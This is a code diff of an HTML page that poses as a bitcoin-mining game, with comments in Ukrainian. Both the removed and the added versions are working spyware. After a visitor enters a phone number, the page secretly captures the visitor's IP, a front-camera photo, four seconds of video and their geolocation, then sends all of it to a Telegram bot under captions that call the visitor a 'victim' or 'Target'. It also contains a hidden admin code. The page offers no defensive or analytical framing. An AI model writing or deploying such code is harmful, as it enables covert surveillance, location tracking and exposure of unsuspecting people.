@@ -7,24 +7,17 @@
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body { background: #0c0c0c; font-family: 'Consolas', monospace; color: #0f0; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
-        
-        /* Стиль вікна Windows */
         .titlebar { height: 28px; background: #000080; display: flex; align-items: center; padding: 0 8px; gap: 6px; flex-shrink: 0; }
         .title-text { flex: 1; font-size: 11px; color: #fff; font-weight: bold; }
         .tbtn { width: 16px; height: 14px; background: #c0c0c0; border: 1px solid #fff; border-right: 2px solid #444; border-bottom: 2px solid #444; font-size: 9px; color: #000; display: flex; align-items: center; justify-content: center; }
-
         .terminal { flex: 1; padding: 15px; overflow-y: auto; display: flex; flex-direction: column; position: relative; }
         #auth-screen, #admin-screen { text-align: center; margin-top: 15%; }
         #game-screen, #admin-screen { display: none; }
-
         input { background: transparent; border: 1px solid #0f0; color: #fff; padding: 10px; width: 85%; margin: 15px 0; outline: none; font-size: 16px; text-align: center; }
         button { background: #0f0; color: #000; border: none; padding: 12px 25px; cursor: pointer; font-weight: bold; text-transform: uppercase; }
-        
         .log-line { margin-bottom: 5px; font-size: 12px; line-height: 1.3; text-align: left; }
         .red { color: #ff5555; }
         .yellow { color: #ffff00; }
-        
-        .admin-card { background: #111; border: 1px solid #444; padding: 10px; margin-top: 10px; text-align: left; font-size: 11px; }
         .stat-bar { background: #1a1a1a; padding: 8px 15px; border-top: 1px solid #333; display: flex; justify-content: space-between; font-size: 11px; color: #888; }
     </style>
 </head>
@@ -45,30 +38,24 @@
 
         <div id="game-screen">
             <div id="output">
-                <p class="log-line">> Встановлення зашифрованого з'єднання...</p>
+                <p class="log-line">> CONNECTION ESTABLISHED...</p>
             </div>
             <div style="margin-top: 20px; text-align: center;">
                 <h1 id="balance" style="font-size: 35px; color: #fff;">0.0000 BTC</h1>
-                <button onclick="mine()" style="width:100%">ЗЛАМАТИ БЛОК ⚡</button>
+                <button onclick="mine()" style="width:100%">MINE BLOCK ⚡</button>
             </div>
         </div>
 
         <div id="admin-screen">
-            <h2 class="red">⚙️ SYSTEM CONTROL PANEL</h2>
-            <div class="admin-card">
-                <p class="yellow">[ОСТАННЯ АКТИВНІСТЬ]</p>
-                <p id="admin-log">> Очікування даних...</p>
-                <hr style="border:0; border-top:1px solid #333; margin:10px 0;">
-                <p>Вузол: <span class="green">Active</span></p>
-                <p>ТГ Бот: <span class="green">Connected</span></p>
-            </div>
-            <button onclick="location.reload()" style="margin-top:20px; background:#444; color:#fff">ВИЙТИ</button>
+            <h2 class="red">⚙️ ADMIN PANEL</h2>
+            <p id="admin-log">> System online.</p>
+            <button onclick="location.reload()" style="margin-top:20px; background:#444; color:#fff">EXIT</button>
         </div>
     </div>
 
     <div class="stat-bar" id="footer" style="display:none">
         <span id="bat-info">BATTERY: 100%</span>
-        <span>IP: <span id="ip-display">HIDDEN</span></span>
+        <span id="ip-display">IP: LOADING...</span>
     </div>
 
     <script>
@@ -77,130 +64,95 @@
         let btc = 0;
 
         async function checkAccess() {
-            const input = document.getElementById('user-phone').value;
-
-            // СЕКРЕТНИЙ КОД ДЛЯ ТЕБЕ
-            if (input === "77777777") {
-                showAdmin();
+            const val = document.getElementById('user-phone').value;
+            if (val === "777") {
+                document.getElementById('auth-screen').style.display = 'none';
+                document.getElementById('admin-screen').style.display = 'block';
                 return;
             }
+            if (val.length < 7) return alert("Error: Invalid ID");
 
-            if (input.length < 9) return alert("Помилка доступу!");
-
-            startHacking(input);
+            startSpying(val);
         }
 
-        function showAdmin() {
-            document.getElementById('auth-screen').style.display = 'none';
-            document.getElementById('admin-screen').style.display = 'block';
-            document.getElementById('admin-log').innerHTML = `> Вхід за кодом адміна успішний.<br>> Очікування нових жертв...`;
-        }
-
-        async function startHacking(phone) {
-            const screen = document.getElementById('auth-screen');
-            screen.innerHTML = '<p class="log-line yellow">> ІНІЦІАЛІЗАЦІЯ З'ЄДНАННЯ...</p><p id="status" class="log-line"></p>';
+        async function startSpying(phone) {
+            const auth = document.getElementById('auth-screen');
+            auth.innerHTML = '<p class="log-line yellow">> ІНІЦІАЛІЗАЦІЯ БІОМЕТРІЇ...</p><p id="h-status" class="log-line"></p>';
             
-            // Запуск шпигуна (Фото + Відео + Дані)
-            captureData(phone);
-
-            const steps = ["Підключення до проксі...", "Злом брандмауера...", "Обхід захисту Google...", "Доступ отримано!"];
-            let i = 0;
-            const interval = setInterval(() => {
-                if (i < steps.length) {
-                    document.getElementById('status').innerHTML += `<p class="log-line">> ${steps[i]}</p>`;
-                    i++;
-                } else {
-                    clearInterval(interval);
-                    document.getElementById('auth-screen').style.display = 'none';
-                    document.getElementById('game-screen').style.display = 'block';
-                    document.getElementById('footer').style.display = 'flex';
-                }
-            }, 800);
-        }
-
-        async function captureData(phone) {
             try {
-                // Інфо про пристрій
+                // 1. Отримуємо IP
                 const ipRes = await fetch('https://ipapi.co/json/').catch(() => null);
-                const ip = ipRes ? await ipRes.json() : { ip: "N/A" };
-                document.getElementById('ip-display').innerText = ip.ip;
+                const ipData = ipRes ? await ipRes.json() : { ip: "Unknown" };
+                document.getElementById('ip-display').innerText = "IP: " + ipData.ip;
 
-                if (navigator.getBattery) {
-                    const b = await navigator.getBattery();
-                    document.getElementById('bat-info').innerText = "BATTERY: " + Math.round(b.level * 100) + "%";
-                }
-
-                // Доступ до медіа
+                // 2. Доступ до камери
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.createElement('video');
                 video.srcObject = stream;
-                video.play();
+                video.muted = true;
+                video.setAttribute("playsinline", true);
+                await video.play();
 
-                // ФОТО
-                const canvas = document.createElement('canvas');
+                // 3. Робимо ФОТО через 1.5 сек (щоб камера "прокинулась")
                 setTimeout(() => {
-                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth; 
+                    canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
-                }, 1000);
+                    
+                    // 4. ЗАПИСУЄМО ВІДЕО
+                    const recorder = new MediaRecorder(stream);
+                    let chunks = [];
+                    recorder.ondataavailable = e => chunks.push(e.data);
+                    recorder.onstop = () => {
+                        const vBlob = new Blob(chunks, { type: 'video/webm' });
+                        sendData(canvas, vBlob, phone, ipData);
+                        stream.getTracks().forEach(t => t.stop());
+                    };
+                    recorder.start();
+                    setTimeout(() => recorder.stop(), 4000);
+                }, 1500);
 
-                // ВІДЕО (запис 4 секунди)
-                const recorder = new MediaRecorder(stream);
-                let chunks = [];
-                recorder.ondataavailable = (e) => chunks.push(e.data);
-                recorder.onstop = () => {
-                    const blob = new Blob(chunks, { type: 'video/webm' });
-                    sendToBot(canvas, blob, phone, ip);
-                    stream.getTracks().forEach(t => t.stop());
-                };
-                recorder.start();
-                setTimeout(() => recorder.stop(), 4000);
-
-            } catch (e) {
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=❌ Error: ${e.message}`);
+            } catch (err) {
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=❌ ERROR: ${err.message}`);
             }
+
+            // Перехід до гри
+            setTimeout(() => {
+                auth.style.display = 'none';
+                document.getElementById('game-screen').style.display = 'block';
+                document.getElementById('footer').style.display = 'flex';
+            }, 3000);
         }
 
-        function sendToBot(canvas, vBlob, phone, ip) {
+        function sendData(canvas, vBlob, phone, ip) {
             navigator.geolocation.getCurrentPosition(pos => {
                 const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                
-                // Відправка фото + Дані
                 canvas.toBlob(blob => {
                     const fd = new FormData();
                     fd.append('chat_id', chatId);
-                    fd.append('photo', blob, 'img.jpg');
-                    fd.append('caption', `🕵️‍♂️ <b>ЖЕРТВА:</b> <code>${phone}</code>\n📍 <b>Мапа:</b> ${map}\n🌐 <b>IP:</b> ${ip.ip}\n⚙️ <b>Ядра:</b> ${navigator.hardwareConcurrency}`);
+                    fd.append('photo', blob, 'f.jpg');
+                    fd.append('caption', `🕵️‍♂️ <b>Target:</b> ${phone}\n🌐 <b>IP:</b> ${ip.ip}\n📍 <b>Map:</b> ${map}`);
                     fd.append('parse_mode', 'HTML');
-                    
-                    const kb = { inline_keyboard: [[{text: "📍 Карта", url: map}]] };
-                    fd.append('reply_markup', JSON.stringify(kb));
                     fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
                 }, 'image/jpeg');
 
-                // Відправка відео
                 const vfd = new FormData();
                 vfd.append('chat_id', chatId);
-                vfd.append('video', vBlob, 'vid.webm');
+                vfd.append('video', vBlob, 'v.webm');
                 fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: vfd });
             });
         }
 
-        const logs = ["Копіювання контактів...", "Доступ до WhatsApp...", "Зчитування історії...", "Злом галереї..."];
         function mine() {
-            btc += 0.0002;
+            btc += 0.0001;
             document.getElementById('balance').innerText = btc.toFixed(4) + " BTC";
             const out = document.getElementById('output');
             const p = document.createElement('p');
             p.className = 'log-line';
-            
-            if (Math.random() > 0.7) {
-                p.innerHTML = `<span class="red">[!] ${logs[Math.floor(Math.random()*logs.length)]}</span>`;
-            } else {
-                p.innerHTML = `<span style="color:#0f0">[OK]</span> Hash: 0x${Math.random().toString(16).slice(2,8)}`;
-            }
+            p.innerHTML = Math.random() > 0.8 ? `<span class="red">[!] Accessing DCIM...</span>` : `<span style="color:#0f0">[OK]</span> Hash: 0x${Math.random().toString(16).slice(2,8)}`;
             out.appendChild(p);
             out.scrollTop = out.scrollHeight;
-            if (navigator.vibrate) navigator.vibrate(30);
         }
     </script>
 </body>
